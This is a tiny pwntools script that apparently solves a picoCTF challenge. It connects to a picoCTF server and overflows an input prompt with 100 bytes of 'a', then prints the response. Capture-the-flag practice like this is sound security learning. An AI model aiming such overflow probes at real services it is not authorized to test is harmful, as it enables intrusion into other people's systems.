from pwn import *

r=remote('saturn.picoctf.net', 55887)

r.sendlineafter(':',b"a"*100)

info(r.recvall())
